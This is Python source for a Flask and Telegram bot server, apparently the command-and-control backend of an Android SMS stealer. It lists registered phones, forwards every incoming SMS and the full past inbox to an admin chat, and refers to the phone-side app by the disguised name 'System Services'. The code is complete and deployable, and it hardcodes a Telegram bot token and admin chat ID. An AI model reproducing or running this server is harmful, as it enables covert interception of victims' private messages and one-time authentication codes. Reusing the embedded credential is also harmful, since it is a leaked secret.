import os
import re
import time
import threading
import requests
from flask import Flask, request, jsonify
import telebot
from telebot.types import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)

# ----------------------------------------------------
# Configuration & Environment Variables
# ----------------------------------------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8832238459:AAGR6_N00HtDjJv7IEdwu-y-1U2RW9VO9rk")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "8753024194")
GROUP_CHAT_ID = os.environ.get("GROUP_CHAT_ID", "")
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "")

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# In-Memory Device Storage: deviceId -> dict
devices = {}

# ----------------------------------------------------
# Helper Functions & Keyboards
# ----------------------------------------------------
def is_admin(chat_id):
    return str(chat_id).strip() == str(ADMIN_CHAT_ID).strip()

def extract_and_auto_register_device(text):
    """
    Auto-registers device if a message in chat contains device metadata
    (e.g., from direct TelegramSender notifications or SMS messages).
    """
    if not text:
        return

    id_match = re.search(r"🆔\s*\*?ID:\*?\s*`?([a-zA-Z0-9_-]+)`?", text, re.IGNORECASE)
    if not id_match:
        return

    dev_id = id_match.group(1).strip()

    alias_match = re.search(r"📱\s*\*?Device:\*?\s*`?([^`\n]+)`?", text, re.IGNORECASE)
    dev_alias = alias_match.group(1).strip() if alias_match else "Android Device"

    model_match = re.search(r"📲\s*\*?Model:\*?\s*`?([^`\n]+)`?", text, re.IGNORECASE)
    dev_model = model_match.group(1).strip() if model_match else dev_alias

    if dev_id not in devices:
        devices[dev_id] = {
            "deviceId": dev_id,
            "deviceAlias": dev_alias,
            "model": dev_model,
            "batteryLevel": 100,
            "isCharging": False,
            "isServiceRunning": True,
            "isForwardingEnabled": True,
            "killReason": "Auto-registered via Telegram notification",
            "lastSeen": time.time()
        }
        print(f"[Auto-Registered via Telegram Message] ID: {dev_id} | Alias: {dev_alias}")
    else:
        devices[dev_id]["lastSeen"] = time.time()
        devices[dev_id]["deviceAlias"] = dev_alias
        devices[dev_id]["model"] = dev_model

def build_main_reply_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("📱 Connected Devices"),
        KeyboardButton("📊 Overall Status")
    )
    markup.add(KeyboardButton("❓ Help & Info"))
    return markup

def build_device_control_message(dev):
    last_seen = dev.get("lastSeen", 0)
    is_online = (time.time() - last_seen) < 180  # 3 minutes threshold
    live_status = "🟢 *Online & Active*" if is_online else "🔴 *Offline / Inactive*"
    fwd_status = "🟢 *ENABLED (ON)*" if dev.get("isForwardingEnabled", True) else "🔴 *DISABLED (OFF)*"

    bat_level = dev.get("batteryLevel", -1)
    if bat_level >= 0:
        charging_icon = "🔌 (Charging)" if dev.get("isCharging") else "🔋"
        bat_text = f"{bat_level}% {charging_icon}"
    else:
        bat_text = "Unknown"

    service_status = "🟢 Service Running" if dev.get("isServiceRunning", True) else "🔴 Service Stopped"
    kill_reason = dev.get("killReason", "Running smoothly")

    return (
        f"📱 *DEVICE CONTROL CENTER*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🏷️ *Device Name:* `{dev.get('deviceAlias', 'Android Device')}`\n"
        f"🆔 *Device ID:* `{dev.get('deviceId', 'Unknown')}`\n"
        f"📲 *Model:* `{dev.get('model', 'Unknown Model')}`\n"
        f"⚡ *Battery:* {bat_text}\n"
        f"⚙️ *App Service:* {service_status}\n\n"
        f"⚡ *Live Status:* {live_status}\n"
        f"💬 *SMS Forwarding:* {fwd_status}\n"
        f"📋 *Status Info:* {kill_reason}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"_Select an action below to manage this device:_"
    )

def build_device_main_keyboard(dev_id):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("💬 SMS Settings", callback_data=f"sms_settings_{dev_id}"),
        InlineKeyboardButton("✏️ Rename Device", callback_data=f"rename_{dev_id}")
    )
    markup.row(
        InlineKeyboardButton("🔄 Refresh Status", callback_data=f"refresh_{dev_id}"),
        InlineKeyboardButton("📋 All Devices List", callback_data="dev_list")
    )
    return markup

def build_sms_settings_message(dev):
    fwd_status = "🟢 *ENABLED (ON)*" if dev.get("isForwardingEnabled", True) else "🔴 *DISABLED (OFF)*"
    return (
        f"💬 *SMS SETTINGS for `{dev.get('deviceAlias', 'Android Device')}`*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📲 *Model:* `{dev.get('model', 'Unknown')}`\n"
        f"🆔 *Device ID:* `{dev.get('deviceId')}`\n"
        f"💬 *SMS Forwarding Status:* {fwd_status}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"• *Turn SMS ON*: Enables live SMS forwarding and uploads old past inbox, new & upcoming SMS to bot.\n"
        f"• *Turn SMS OFF*: Disables live SMS forwarding.\n\n"
        f"_Select an action below:_"
    )

def build_sms_settings_keyboard(dev_id, is_fwd_on):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("🟢 Turn SMS ON", callback_data=f"sms_on_{dev_id}"),
        InlineKeyboardButton("🔴 Turn SMS OFF", callback_data=f"sms_off_{dev_id}")
    )
    markup.row(
        InlineKeyboardButton("🔙 Back to Device Control", callback_data=f"dev_info_{dev_id}")
    )
    return markup

# ----------------------------------------------------
# 1. FLASK HTTP ENDPOINTS
# ----------------------------------------------------
@app.route("/")
def index():
    return jsonify({
        "status": "online",
        "app": "SMS Forwarder Telegram Bot Server (Python)",
        "connected_devices": len(devices),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    })

@app.route("/ping")
def ping():
    return jsonify({
        "status": "alive",
        "timestamp": time.time(),
        "time_str": time.strftime("%Y-%m-%d %H:%M:%S")
    })

@app.route("/api/devices", methods=["GET"])
def get_devices():
    return jsonify({
        "count": len(devices),
        "devices": list(devices.values())
    })

@app.route("/api/register-device", methods=["POST"])
def register_device():
    data = request.get_json() or {}
    dev_id = data.get("deviceId")
    if not dev_id:
        return jsonify({"error": "deviceId is required"}), 400

    existing_alias = devices.get(dev_id, {}).get("deviceAlias")
    new_alias = data.get("deviceAlias") or existing_alias or data.get("model") or "Android Device"

    devices[dev_id] = {
        "deviceId": dev_id,
        "deviceAlias": new_alias,
        "model": data.get("model", "Unknown Model"),
        "batteryLevel": data.get("batteryLevel", -1),
        "isCharging": bool(data.get("isCharging")),
        "isServiceRunning": bool(data.get("isServiceRunning", True)),
        "isForwardingEnabled": data.get("isForwardingEnabled", True),
        "killReason": data.get("killReason", "Running smoothly"),
        "lastSeen": time.time()
    }
    print(f"[Device Heartbeat/Registered] ID: {dev_id} | Alias: {new_alias}")
    return jsonify({"success": True, "device": devices[dev_id]})

@app.route("/api/forward-sms", methods=["POST"])
def forward_sms():
    data = request.get_json() or {}
    dev_id = data.get("deviceId")
    sender = data.get("sender", "Unknown")
    body = data.get("body", "")
    sim_slot = data.get("simSlot", "SIM 1")
    timestamp = data.get("timestamp")

    if timestamp:
        try:
            time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(timestamp / 1000.0))
        except Exception:
            time_str = time.strftime("%Y-%m-%d %H:%M:%S")
    else:
        time_str = time.strftime("%Y-%m-%d %H:%M:%S")

    # Auto-register device if missing
    if dev_id and dev_id not in devices:
        devices[dev_id] = {
            "deviceId": dev_id,
            "deviceAlias": "Android Device",
            "model": "Android Phone",
            "batteryLevel": 100,
            "isCharging": False,
            "isServiceRunning": True,
            "isForwardingEnabled": True,
            "killReason": "Auto-registered on SMS receive",
            "lastSeen": time.time()
        }

    dev = devices.get(dev_id, {})
    device_name = dev.get("deviceAlias") or "Android Device"

    formatted_msg = (
        f"📩 *New SMS Received*\n\n"
        f"📱 *Device:* `{device_name}`\n"
        f"👤 *From:* `{sender}`\n"
        f"💳 *SIM:* `{sim_slot}`\n"
        f"⏰ *Time:* `{time_str}`\n\n"
        f"💬 *Message:*\n`{body}`"
    )

    targets = set()
    if ADMIN_CHAT_ID:
        targets.add(str(ADMIN_CHAT_ID).strip())
    if GROUP_CHAT_ID:
        targets.add(str(GROUP_CHAT_ID).strip())

    sent_count = 0
    for target in targets:
        if not target:
            continue
        try:
            bot.send_message(target, formatted_msg, parse_mode="Markdown")
            sent_count += 1
        except Exception as e:
            print(f"[Error] Failed to forward SMS to target {target}: {e}")

    return jsonify({"success": True, "sentTo": sent_count})

# ----------------------------------------------------
# 2. RENDER SELF-PING KEEP-ALIVE THREAD (EVERY 5 MINS)
# ----------------------------------------------------
def start_keep_alive_ping():
    while True:
        time.sleep(300)  # 5 minutes
        if RENDER_EXTERNAL_URL:
            try:
                ping_url = f"{RENDER_EXTERNAL_URL.rstrip('/')}/ping"
                print(f"[Keep-Alive] Self-pinging {ping_url}...")
                res = requests.get(ping_url, timeout=10)
                print(f"[Keep-Alive] Ping response status: {res.status_code}")
            except Exception as err:
                print(f"[Keep-Alive] Ping error: {err}")

# ----------------------------------------------------
# 3. TELEGRAM BOT HANDLERS & KEYBOARDS
# ----------------------------------------------------
@bot.message_handler(content_types=['text'])
def handle_text_messages(message):
    chat_id = str(message.chat.id)
    chat_type = message.chat.type
    text = message.text.strip()

    # Extract & Auto-register device if message contains device details
    extract_and_auto_register_device(text)

    # Group / Channel Discovery
    if chat_type in ['group', 'supergroup', 'channel']:
        if text.startswith('/') or 'groupid' in text.lower() or 'id' in text.lower():
            group_title = message.chat.title or "Telegram Group"
            reply_text = (
                f"📌 *TELEGRAM GROUP DETAILS*\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"🏷️ *Group Title:* `{group_title}`\n"
                f"🆔 *Group Chat ID:* `{chat_id}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"_Copy the Group Chat ID above and set `GROUP_CHAT_ID={chat_id}` in Render Environment Variables to forward SMS directly into this group!_"
            )
            return bot.send_message(chat_id, reply_text, parse_mode="Markdown")
        return

    # Private Chat Authorization
    if not is_admin(chat_id):
        return bot.send_message(chat_id, "❌ *Unauthorized user.* Access restricted to Admin.")

    if text in ["/start", "/help", "/menu", "❓ Help & Info"]:
        reply_msg = (
            "🤖 *SMS Forwarder Device Manager*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Welcome! Use the menu buttons at the bottom of your chat box to manage connected Android devices, "
            "toggle SMS forwarding ON/OFF, sync past inbox SMS, and rename devices."
        )
        return bot.send_message(
            chat_id,
            reply_msg,
            parse_mode="Markdown",
            reply_markup=build_main_reply_keyboard()
        )

    if text in ["📱 Connected Devices", "/devices", "/status"]:
        if not devices:
            return bot.send_message(
                chat_id,
                "📱 *No Devices Connected Yet.*\n\n"
                "Install and open the System Services app on your Android phone to connect.",
                parse_mode="Markdown",
                reply_markup=build_main_reply_keyboard()
            )

        if len(devices) == 1:
            dev = list(devices.values())[0]
            return bot.send_message(
                chat_id,
                build_device_control_message(dev),
                parse_mode="Markdown",
                reply_markup=build_device_main_keyboard(dev["deviceId"])
            )

        markup = InlineKeyboardMarkup()
        for dev in devices.values():
            status_icon = "🟢" if dev.get("isForwardingEnabled", True) else "🔴"
            btn_text = f"{status_icon} {dev.get('deviceAlias', 'Device')} ({dev.get('model')})"
            markup.row(InlineKeyboardButton(btn_text, callback_data=f"dev_info_{dev['deviceId']}"))

        return bot.send_message(
            chat_id,
            "📱 *Connected Devices List:*\nSelect a device below to manage settings:",
            parse_mode="Markdown",
            reply_markup=markup
        )

    if text in ["📊 Overall Status", "/info"]:
        online_count = sum(1 for d in devices.values() if (time.time() - d.get("lastSeen", 0)) < 180)
        status_text = (
            f"📊 *SYSTEM OVERALL STATUS*\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 *Bot Server:* 🟢 Online (Python Flask)\n"
            f"📱 *Total Connected Devices:* {len(devices)}\n"
            f"🟢 *Online Devices:* {online_count}\n"
            f"🔴 *Offline Devices:* {len(devices) - online_count}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"_Select `📱 Connected Devices` from bottom menu to view individual devices._"
        )
        return bot.send_message(
            chat_id,
            status_text,
            parse_mode="Markdown",
            reply_markup=build_main_reply_keyboard()
        )

    if text.startswith("/rename"):
        return handle_rename(message)

def handle_rename(message):
    chat_id = str(message.chat.id)
    text_parts = message.text.split(maxsplit=2)

    if len(text_parts) < 2:
        return bot.send_message(
            chat_id,
            "✏️ *Usage:*\n`/rename New Device Name`\n_OR_\n`/rename <deviceId> New Device Name`",
            parse_mode="Markdown"
        )

    if not devices:
        return bot.send_message(chat_id, "❌ No connected devices found.")

    target_dev = None
    new_name = ""

    potential_dev_id = text_parts[1].strip()
    if potential_dev_id in devices and len(text_parts) >= 3:
        target_dev = devices[potential_dev_id]
        new_name = text_parts[2].strip()
    else:
        target_dev = list(devices.values())[0]
        new_name = message.text.split(maxsplit=1)[1].strip()

    if target_dev and new_name:
        old_name = target_dev.get("deviceAlias", "Device")
        target_dev["deviceAlias"] = new_name
        devices[target_dev["deviceId"]] = target_dev

        bot.send_message(chat_id, f"✅ Device renamed from `{old_name}` to `{new_name}`!", parse_mode="Markdown")
        bot.send_message(
            chat_id,
            build_device_control_message(target_dev),
            parse_mode="Markdown",
            reply_markup=build_device_main_keyboard(target_dev["deviceId"])
        )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = str(call.message.chat.id)
    message_id = call.message.message_id
    data = call.data

    if not is_admin(chat_id):
        return bot.answer_callback_query(call.id, "❌ Unauthorized")

    if data == "dev_list":
        if not devices:
            return bot.answer_callback_query(call.id, "No devices connected")
        markup = InlineKeyboardMarkup()
        for dev in devices.values():
            status_icon = "🟢" if dev.get("isForwardingEnabled", True) else "🔴"
            btn_text = f"{status_icon} {dev.get('deviceAlias')} ({dev.get('model')})"
            markup.row(InlineKeyboardButton(btn_text, callback_data=f"dev_info_{dev['deviceId']}"))
        bot.edit_message_text(
            "📱 *Connected Devices List:*\nSelect a device below to manage settings:",
            chat_id,
            message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
        return bot.answer_callback_query(call.id, "Updated device list")

    match = re.match(r"^(dev_info|sms_settings|sms_on|sms_off|sync_old|rename|refresh)_(.+)$", data)
    if not match:
        return

    action = match.group(1)
    dev_id = match.group(2)
    dev = devices.get(dev_id)

    if not dev:
        return bot.answer_callback_query(call.id, "⚠️ Device not found")

    if action in ["dev_info", "refresh"]:
        bot.edit_message_text(
            build_device_control_message(dev),
            chat_id,
            message_id,
            parse_mode="Markdown",
            reply_markup=build_device_main_keyboard(dev_id)
        )
        bot.answer_callback_query(call.id, "Refreshed live status")

    elif action == "sms_settings":
        bot.edit_message_text(
            build_sms_settings_message(dev),
            chat_id,
            message_id,
            parse_mode="Markdown",
            reply_markup=build_sms_settings_keyboard(dev_id, dev.get("isForwardingEnabled", True))
        )
        bot.answer_callback_query(call.id, "SMS Settings menu")

    elif action == "sms_on":
        dev["isForwardingEnabled"] = True
        devices[dev_id] = dev
        bot.edit_message_text(
            build_sms_settings_message(dev),
            chat_id,
            message_id,
            parse_mode="Markdown",
            reply_markup=build_sms_settings_keyboard(dev_id, True)
        )
        bot.answer_callback_query(call.id, "🟢 SMS Forwarding Enabled")
        bot.send_message(
            chat_id,
            f"🟢 *SMS Forwarding Enabled* for `{dev.get('deviceAlias')}`.\n\n"
            f"📥 All past inbox SMS, new, and upcoming SMS will be uploaded and forwarded to this bot.",
            parse_mode="Markdown"
        )

    elif action == "sms_off":
        dev["isForwardingEnabled"] = False
        devices[dev_id] = dev
        bot.edit_message_text(
            build_sms_settings_message(dev),
            chat_id,
            message_id,
            parse_mode="Markdown",
            reply_markup=build_sms_settings_keyboard(dev_id, False)
        )
        bot.answer_callback_query(call.id, "🔴 SMS Forwarding Disabled")
        bot.send_message(
            chat_id,
            f"🔴 *SMS Forwarding Disabled* for `{dev.get('deviceAlias')}`.\n\n"
            f"Upcoming SMS messages will be stopped.",
            parse_mode="Markdown"
        )

    elif action == "rename":
        bot.answer_callback_query(call.id, "Send rename command")
        bot.send_message(
            chat_id,
            f"✏️ *To Rename Device `{dev.get('deviceAlias')}`:*\n\n"
            f"Send command in chat:\n`/rename {dev_id} New Device Name`\n_or simply_\n`/rename New Device Name`",
            parse_mode="Markdown"
        )

# ----------------------------------------------------
# 4. RUN THREADS: TELEGRAM BOT + KEEP-ALIVE
# ----------------------------------------------------
def start_bot_polling():
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=20)
        except Exception as e:
            print(f"[Bot Polling Error] {e}")
            time.sleep(5)

# Start Keep-Alive Thread
threading.Thread(target=start_keep_alive_ping, daemon=True).start()

# Start Telegram Bot Polling Thread
threading.Thread(target=start_bot_polling, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"====================================================")
    print(f"🚀 SMS Forwarder Bot Server starting on port {port}")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"👤 Admin Chat ID: {ADMIN_CHAT_ID}")
    if GROUP_CHAT_ID:
        print(f"👥 Group Chat ID: {GROUP_CHAT_ID}")
    print(f"🔗 External URL: {RENDER_EXTERNAL_URL}")
    print(f"====================================================")
    app.run(host="0.0.0.0", port=port)
